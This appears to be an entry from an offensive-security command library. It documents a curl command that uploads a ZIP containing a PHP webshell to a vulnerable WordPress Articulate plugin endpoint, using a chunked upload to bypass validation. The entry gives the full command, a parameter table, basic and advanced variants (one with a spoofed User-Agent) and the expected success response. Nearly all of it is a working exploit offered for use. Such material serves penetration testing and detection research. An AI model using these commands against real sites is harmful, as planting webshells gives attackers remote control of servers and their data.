---
data: >-
  curl http://target.com/wp-json/articulate/v1/upload-data -F
  "name=malicious.zip" -F "chunk=0" -F "chunks=1" -F "file=@malicious.zip"
tags:
  - upload
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:19.958Z'
id: 2aa5254a-15c1-40e1-8a8c-0660291b8e5f
verified: false
validated: true
submitted: true
---
# curl-upload-zip-to-articulate

## Command

```bash
curl http://target.com/wp-json/articulate/v1/upload-data -F "name=malicious.zip" -F "chunk=0" -F "chunks=1" -F "file=@malicious.zip"
```

## Description

This command uploads a local ZIP file containing a PHP webshell to the vulnerable WordPress Articulate plugin endpoint using multipart form data, simulating a chunked upload to bypass validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-F "name=..."` | Filename for the uploaded ZIP | Yes |
| `-F "chunk=..."` | Chunk number (use 0 for single) | Yes |
| `-F "chunks=..."` | Total chunks (use 1 for single) | Yes |
| `-F "file=@..."` | Path to local ZIP file | Yes |

## Examples

### Basic Usage

```bash
curl http://example.com/wp-json/articulate/v1/upload-data -F "name=test.zip" -F "chunk=0" -F "chunks=1" -F "file=@test.zip"
```

### Advanced Usage

```bash
curl -v http://target.com/wp-json/articulate/v1/upload-data -F "name=exploit.zip" -F "chunk=0" -F "chunks=1" -F "file=@exploit.zip" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

HTTP 200 response with JSON like {"message": "Reading upload complete"} indicating successful upload and extraction.

## Related

- [[Related Procedure: Upload-ZIP-to-Vulnerable-Endpoint]]
